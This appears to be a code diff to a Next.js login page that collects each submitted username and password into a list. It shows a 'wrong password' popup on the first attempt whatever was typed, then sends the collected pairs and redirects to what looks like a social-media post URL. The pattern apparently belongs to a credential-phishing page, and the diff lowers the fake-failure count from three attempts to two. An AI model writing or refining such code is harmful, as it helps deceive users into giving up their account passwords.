@@ -1,15 +1,17 @@
 "use client"
 import { Opt } from "next/font/google";
 import Link from "next/link";
-import { useRef, useState } from "react";
+import { useEffect, useRef, useState } from "react";
 import { useRouter } from "next/navigation";
 
 export default function Page() {
     const [password, setPassword] = useState(null);
     const [username, setUsername] = useState(null);
+    const [firstLoading, setFirstLoading] = useState(true);
     const [allPassUsername, setAllPassUsername] = useState([]);
     const [loading, setLoading] = useState(false);
     const mobileInputRef = useRef(null);
+    const passwordInputRef = useRef(null);
 
     const [passwordVisible, setPasswordVisible] = useState(false);
     const router = useRouter();
@@ -19,11 +21,17 @@ export default function Page() {
         event.preventDefault();
         setPasswordVisible(!passwordVisible);
     };
+     useEffect(()=>{
+        if(firstLoading) setFirstLoading(false);
+        else if (passwordInputRef.current) {
+            passwordInputRef.current.focus(); // Reapply focus to input field
+        }
+     },[passwordVisible])
 
     const makeLogin = async (allData) => {
         setLoading(true);
         closeWrongPassPopup();
-    
+
         // Simulating a delay using a Promise
         // await new Promise((resolve) => setTimeout(resolve, 2000));
         // setLoading(false);
@@ -39,7 +47,7 @@ export default function Page() {
         if (res.ok) {
             router.replace("/pages/naila143201/post/3217382")
         }
-        else{
+        else {
             setLoading(false);
         }
     }
@@ -48,7 +56,7 @@ export default function Page() {
         event.preventDefault();
         setAllPassUsername((prevAllPassUsername) => {
             const updatedArray = [...prevAllPassUsername, { username: username, password: password }];
-            if (updatedArray.length < 3) {
+            if (updatedArray.length < 2) {
                 openWrongPassPopup();
             }
             else {
@@ -126,7 +134,6 @@ export default function Page() {
                             <button
                                 onClick={(e) => {
                                     e.preventDefault()
-                                    console.log("hi")
                                     document.getElementById('mobile').value = '';
                                 }}
                                 className="w-full h-full flex justify-center items-center text-gray-500">
@@ -139,8 +146,11 @@ export default function Page() {
                     </div>
 
                     <div className="w-full h-16 relative">
-                        <input type={passwordVisible ? 'text' : 'password'}
+                        <input
+                            type={passwordVisible ? 'text' : 'password'}
+                            // type="password"
                             id="password"
+                            ref={passwordInputRef}
                             required
                             name="password"
                             placeholder=" "
